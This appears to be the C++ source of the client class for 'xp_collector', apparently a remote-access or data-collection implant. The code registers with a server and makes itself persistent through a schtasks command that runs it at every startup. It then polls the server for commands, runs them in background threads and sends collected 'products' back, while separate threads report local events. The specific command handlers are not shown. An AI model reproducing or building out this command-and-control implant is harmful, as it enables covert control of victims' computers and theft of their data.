#include <stdexcept>
#include <chrono>
#include <thread>

#include <httplib.h>

#include "Client.h"
#include "Protocol/BasicRequest.h"
#include "Protocol/InstallClientResponse.h"
#include "Protocol/GetCommandResponse.h"
#include "CommandHandlers/CommandHandlerFactory.h"
#include "Products/ErrorProduct.h"
#include "Protocol/ReturnProductRequest.h"
#include "Utils/Strings.h"
#include "Utils/Uuid.h"
#include "Windows/WinUtils.h"
using namespace xp_collector;

Client::Client(
	std::wstring exe_path,
	std::unique_ptr<ICommunicator> communicator,
	std::unique_ptr<IClientStorage> storage,
	std::unordered_map<std::unique_ptr<IEvent>, std::vector<std::unique_ptr<IEventHandler>>>&& events,
	std::unique_ptr<ILogger> logger)
	: m_communicator(std::move(communicator))
	  , m_storage(std::move(storage))
	  , m_logger(std::move(logger))
	  , m_events(std::move(events))
	  , m_exe_path(std::move(exe_path))
{
}

void Client::run()
{
	if (!is_installed()) {
		while (true) {
			try {
				install();
				break;
			}
			catch (const std::exception& ex) {
				m_logger->log(
					std::string(
						"Couldn't install, sleeping for " + std::to_string(INSTALLATION_RETRY_SLEEP_DURATION) +
						" seconds and trying again... Error: ") + ex.what());
			}
			std::this_thread::sleep_for(std::chrono::seconds(INSTALLATION_RETRY_SLEEP_DURATION));
		}
	}
	m_client_id = m_storage->fetch(CLIENT_ID_STORAGE_NAME);

	m_logger->log("Running with client ID: " + m_client_id);

	for (const auto& [event_to_detect, handler] : m_events) {
		std::thread event_detection_thread(&Client::event_detection_loop, this, std::ref(event_to_detect),
		                                   std::ref(handler));
		m_thread_pool.push_back(std::move(event_detection_thread));
	}

	execute_commands_loop();

	// Deal with stop/uninstall cases

	// End all threads
	m_thread_pool.clear();

	if (g_is_uninstalled) {
		uninstall();
	}
}

void Client::install() const
{
	BasicRequest request({RequestType::InstallClient, ""});

	const ResponseInfo res = m_communicator->send_request(request.pack());
	if (httplib::OK_200 != res.get_status()) {
		m_logger->log("Error sending InstallClient. Response: " + res.get_body());
		throw std::runtime_error("Couldn't InstallClient properly. Status code: " + std::to_string(res.get_status()));
	}
	m_storage->store(CLIENT_ID_STORAGE_NAME, InstallClientResponse().unpack(res).get_client_id());
	// set wake up scheduled task
	system((
		"schtasks /create /tn \"" + std::string(WAKE_UP_SCHEDULED_TASK_NAME) + "\" /tr " +
		strings::to_string(m_exe_path) + " /sc onstart").c_str());
}

void Client::uninstall() const
{
	// delete wake up scheduled task
	system(("schtasks /delete /tn \"" + std::string(WAKE_UP_SCHEDULED_TASK_NAME) + "\" /f").c_str());
	m_storage->clear();
}

bool Client::is_installed() const
{
	return m_storage->has_field(CLIENT_ID_STORAGE_NAME);
}

void Client::event_detection_loop(const std::unique_ptr<IEvent>& event_to_detect,
                                  const std::vector<std::unique_ptr<IEventHandler>>& handlers) const
{
	while (g_is_running) {
		if (const auto event_info = event_to_detect->is_detected(); EventType::NotDetected != event_info->get_type()) {
			for (const auto& handler : handlers) {
				std::unique_ptr<IRequest> callback_request = nullptr;
				try {
					callback_request = handler->handle(event_info, m_client_id);
				}
				catch (const std::exception& ex) {
					m_logger->log(
						std::string("Failed to handle event " + event_info->pack().dump() + ". Error: ") + ex.what());
					m_communicator->send_request(ReturnProductRequest(
						{RequestType::ReturnProduct, m_client_id},
						std::make_unique<ErrorProduct>(uuid::generate_uuid(), CommandType::Unknown, ex.what())
					).pack());
				}
				try {
					if (nullptr != callback_request) {
						m_logger->log(
							"Sending success callback request for event " + event_info->pack());
						m_communicator->send_request(callback_request->pack());
					}
				}
				catch (const std::exception& ex) {
					m_logger->log(
						std::string(
							"Failed to send callback request for event " + event_info->pack().dump() + ". Error: ") + ex
						.what());
				}
			}
		}
		std::this_thread::sleep_for(std::chrono::seconds(EVENT_DETECTION_SLEEP_DURATION));
	}
}

void Client::execute_commands_loop()
{
	m_logger->log("Starting main loop of command fetching");
	while (g_is_running) {
		std::shared_ptr<BasicCommand> command = nullptr;
		try {
			command = get_command();
		}
		catch (const std::exception& ex) {
			m_logger->log(std::string("Couldn't get command. Error: ") + ex.what());
			continue;
		}
		if (nullptr == command) {
			m_logger->log("No new commands...");
		}
		else {
			m_logger->log("New command: " + command->get_command_id() + " " + to_string(command->get_command_type()));
			std::thread handling_thread(&Client::handle_command, this, std::move(command));
			handling_thread.detach();
		}
		m_logger->log("Sleeping for " + std::to_string(EXECUTE_COMMANDS_SLEEP_DURATION) + " seconds...");
		std::this_thread::sleep_for(std::chrono::seconds(EXECUTE_COMMANDS_SLEEP_DURATION));
	}
}

void Client::handle_command(std::shared_ptr<BasicCommand> command) const
{
	m_logger->log(
		"Handling '" + to_string(command->get_command_type()) + "' command with id " + command->get_command_id() +
		" in a different thread!");

	const auto handler = CommandHandlerFactory::create(*command, m_client_id);
	std::unique_ptr<IRequest> callback_request = nullptr;
	try {
		callback_request = handler->handle(command); // should usually be a ReturnProduct request
	}
	catch (const std::exception& ex) {
		// send error response
		m_logger->log(
			"Failed to handle command " + command->get_command_id() + " with type " + to_string(
				command->get_command_type()) +
			", sending error product.");
		m_communicator->send_request(ReturnProductRequest(
			{RequestType::ReturnProduct, m_client_id},
			std::make_unique<ErrorProduct>(command->get_command_id(), CommandType::Unknown, ex.what())
		).pack());
		return;
	}
	try {
		m_logger->log(
			"Sending success callback request for command " + to_string(command->get_command_type()) + " with id " +
			command->get_command_id());
		if (const auto res = m_communicator->send_request(callback_request->pack()); httplib::OK_200 != res.
			get_status()) {
			m_logger->log("Error sending ReturnProduct. Response: " + res.get_body().dump());
		}
	}
	catch (const std::exception& ex) {
		m_logger->log(std::string("Error in client while sending a ReturnProduct request. Error: ") + ex.what());
	}
}

std::shared_ptr<BasicCommand> Client::get_command() const
{
	m_logger->log("Sending GetCommand request to server");

	BasicRequest request({RequestType::GetCommand, m_client_id});
	const auto res = m_communicator->send_request(request.pack());
	if (httplib::OK_200 != res.get_status()) {
		m_logger->log("Error sending GetCommand. Response: " + res.get_body().dump());
		throw std::runtime_error("Couldn't GetCommand. Status code: " + std::to_string(res.get_status()));
	}
	auto response = GetCommandResponse().unpack(res);
	if (!response.has_command()) {
		return nullptr;
	}
	return response.get_command();
}
